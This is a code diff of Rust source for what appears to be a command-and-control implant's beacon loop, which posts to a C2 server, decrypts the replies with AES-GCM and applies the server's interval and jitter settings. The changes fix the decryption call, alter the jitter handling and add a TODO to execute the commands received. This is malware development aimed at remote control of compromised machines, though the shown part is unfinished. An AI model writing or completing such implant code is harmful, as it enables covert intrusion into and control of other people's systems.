@@ -347,22 +347,24 @@ pub unsafe fn beacon_loop(config: &C2Config) {
                 debug!("[BEACON] Response recived ({} bytes)", response_data.len());
 
                 // Decrypt response
-                if let Some(plaintext) = Some(0) { //crypto::aes256_gcm_dencrypt(&key, &response_data) {
+                if let Some(plaintext) = crypto::aes256_gcm_decrypt(&key, &response_data) {
                     // Parse Command
                     let mut reader = JsonReader::new(&plaintext); 
                     if let Some(response) = reader.parse_beacon_response() {
                         // update interval/jitter if server sent new values
                         if let Some(new_interval) = response.interval {
-                            interval = new_interval * 1000; // because server will send seconds
+                            interval = new_interval * 1000u64; // because server will send seconds
                             debug!("[BEACON] Interval update: {}ms", interval);
                         }
                         if let Some(new_jitter) = response.jitter {
-                            jitter = new_jitter * 1000; // because server will send seconds
-                            debug!("[BEACON] Jitter update: {}ms", jitter);
+                            jitter = new_jitter; // because server will send seconds
+                            debug!("[BEACON] Jitter update: {}%", jitter);
                         }
+                        // TODO: Execute commands and send result
                     }
+                } else {
+                    debug!("[BEACON] Decryption failed, key mismatch?");
                 }
-                unimplemented!()
             }
             None => {
                 debug!("[BEACON] POST failed, server unreachable");
@@ -371,7 +373,7 @@ pub unsafe fn beacon_loop(config: &C2Config) {
         }
 
         // Sleep with jitter
-        beacon_sleep(interval, jitter)
+        // beacon_sleep(interval, jitter)
     }
 }
 
